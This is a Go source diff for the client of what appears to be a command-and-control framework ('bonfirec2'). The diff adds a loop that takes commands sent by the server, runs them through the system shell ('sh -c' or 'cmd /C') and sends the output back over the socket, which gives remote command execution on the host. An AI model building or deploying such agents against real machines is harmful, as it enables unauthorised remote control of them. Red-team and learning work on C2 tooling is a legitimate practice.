@@ -3,12 +3,17 @@ package client
 import (
 	"bufio"
 	"errors"
+	"fmt"
 	"io"
 	"log"
 	"net"
 	"os"
+	"os/exec"
+	"runtime"
 	"strings"
 	"time"
+
+	"github.com/Jojojojodr/bonfirec2/pkg/commands"
 )
 
 var input = make(chan string)
@@ -84,7 +89,22 @@ func (c *Client) handleMessageRead(readErr chan<- error) {
 			}
 			return
 		}
-		log.Printf("Received from server: %s", strings.TrimSpace(response))
+
+		incoming := strings.TrimSpace(response)
+		if incoming == "" {
+			continue
+		}
+
+		log.Printf("Received from server: %s", incoming)
+		if output, ok := handleServerCommand(incoming); ok {
+			if _, err := c.Conn.Write([]byte(output + "\n")); err != nil {
+				select {
+				case readErr <- err:
+				default:
+				}
+				return
+			}
+		}
 	}
 }
 
@@ -97,7 +117,7 @@ func (c *Client) handleMessageSend(readErr <-chan error) error {
 			if !ok {
 				return errors.New("input channel closed")
 			}
-
+			
 			if message == "exit" {
 				log.Println("Exiting...")
 				c.Close()
@@ -117,4 +137,56 @@ func NewClient(port string, address string) *Client {
 		Address: address,
 		Conn:    nil,
 	}
+}
+
+func handleServerCommand(incoming string) (string, bool) {
+	command := incoming
+	if strings.HasPrefix(command, "/") {
+		parsed, ok := commands.ParseSlashCommand(command)
+		if !ok {
+			return "unknown command", true
+		}
+		command = parsed
+	}
+
+	if !commands.IsKnown(command) {
+		return "", false
+	}
+
+	return executeCommand(command), true
+}
+
+func executeCommand(command string) string {
+	resolved := command
+	switch command {
+	case "ping":
+		if runtime.GOOS == "windows" {
+			resolved = "ping -n 1 127.0.0.1"
+		} else {
+			resolved = "ping -c 1 127.0.0.1"
+		}
+	}
+
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", resolved)
+	} else {
+		cmd = exec.Command("sh", "-c", resolved)
+	}
+
+	output, err := cmd.CombinedOutput()
+	trimmed := strings.TrimRight(string(output), "\r\n")
+
+	if err != nil {
+		if trimmed == "" {
+			return fmt.Sprintf("command failed: %v", err)
+		}
+		return fmt.Sprintf("%s\ncommand failed: %v", trimmed, err)
+	}
+
+	if trimmed == "" {
+		return "(no output)"
+	}
+
+	return trimmed
 }
